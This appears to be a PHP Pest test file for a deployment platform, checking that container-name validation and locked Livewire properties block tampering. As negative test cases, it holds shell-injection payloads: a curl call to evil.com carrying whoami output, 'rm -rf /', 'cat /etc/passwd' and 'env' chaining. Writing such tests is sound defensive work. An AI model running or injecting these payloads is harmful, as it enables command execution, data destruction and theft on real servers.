<?php

use App\Livewire\Project\Database\ImportForm;
use App\Models\Environment;
use App\Models\InstanceSettings;
use App\Models\Project;
use App\Models\Server;
use App\Models\StandaloneDocker;
use App\Models\StandalonePostgresql;
use App\Models\Team;
use App\Models\User;
use App\Support\ValidationPatterns;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Livewire\Features\SupportLockedProperties\CannotUpdateLockedPropertyException;
use Livewire\Livewire;

uses(RefreshDatabase::class);

describe('container name validation', function () {
    test('isValidContainerName accepts valid container names', function () {
        expect(ValidationPatterns::isValidContainerName('my-container'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('my_container'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('container123'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('my.container.name'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('a'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('abc-def_ghi.jkl'))->toBeTrue();
    });

    test('isValidContainerName rejects command injection payloads', function () {
        // Command substitution
        expect(ValidationPatterns::isValidContainerName('$(curl http://evil.com/$(whoami))'))->toBeFalse();
        expect(ValidationPatterns::isValidContainerName('$(whoami)'))->toBeFalse();

        // Backtick injection
        expect(ValidationPatterns::isValidContainerName('`id`'))->toBeFalse();

        // Semicolon chaining
        expect(ValidationPatterns::isValidContainerName('container;rm -rf /'))->toBeFalse();

        // Pipe injection
        expect(ValidationPatterns::isValidContainerName('container|cat /etc/passwd'))->toBeFalse();

        // Ampersand chaining
        expect(ValidationPatterns::isValidContainerName('container&&env'))->toBeFalse();

        // Spaces (not valid in Docker container names)
        expect(ValidationPatterns::isValidContainerName('container name'))->toBeFalse();

        // Newlines
        expect(ValidationPatterns::isValidContainerName("container\nid"))->toBeFalse();

        // Must start with alphanumeric
        expect(ValidationPatterns::isValidContainerName('-container'))->toBeFalse();
        expect(ValidationPatterns::isValidContainerName('.container'))->toBeFalse();
        expect(ValidationPatterns::isValidContainerName('_container'))->toBeFalse();
    });
});

describe('locked properties', function () {
    beforeEach(function () {
        InstanceSettings::forceCreate(['id' => 0]);

        $team = Team::factory()->create();
        $user = User::factory()->create();
        $team->members()->attach($user, ['role' => 'admin']);
        $this->actingAs($user);
        session(['currentTeam' => $team]);

        $server = Server::factory()->create(['team_id' => $team->id]);
        $destination = StandaloneDocker::firstOrCreate(
            ['server_id' => $server->id, 'network' => 'coolify'],
            ['uuid' => (string) Str::uuid(), 'name' => 'docker']
        );
        $project = Project::factory()->create(['team_id' => $team->id]);
        $environment = Environment::factory()->create(['project_id' => $project->id]);
        $this->database = StandalonePostgresql::create([
            'uuid' => (string) Str::uuid(),
            'name' => 'db',
            'postgres_user' => 'postgres',
            'postgres_password' => 'password',
            'postgres_db' => 'db',
            'image' => 'postgres:17',
            'status' => 'running',
            'environment_id' => $environment->id,
            'destination_id' => $destination->id,
            'destination_type' => $destination->getMorphClass(),
        ]);
    });

    test('rejects client updates to locked property', function (string $property, mixed $value) {
        Livewire::test(ImportForm::class, ['resource' => $this->database])
            ->set($property, $value);
    })->with([
        'container' => ['container', '$(curl http://evil.com/$(whoami))'],
        'serverId' => ['serverId', 999],
        'resourceId' => ['resourceId', 999],
        'resourceType' => ['resourceType', Server::class],
        'resourceUuid' => ['resourceUuid', 'other-uuid'],
        'resourceDbType' => ['resourceDbType', 'standalone-mysql'],
    ])->throws(CannotUpdateLockedPropertyException::class);

    test('server is scoped to the team of the database', function () {
        $ownServer = $this->database->destination->server;
        $otherServer = Server::factory()->create(['team_id' => Team::factory()->create()->id]);

        $form = new ImportForm;
        $form->resourceId = $this->database->id;
        $form->resourceType = $this->database->getMorphClass();

        $form->serverId = $ownServer->id;
        expect($form->server()?->id)->toBe($ownServer->id);

        $form->serverId = $otherServer->id;
        expect($form->server())->toBeNull();
    });
});
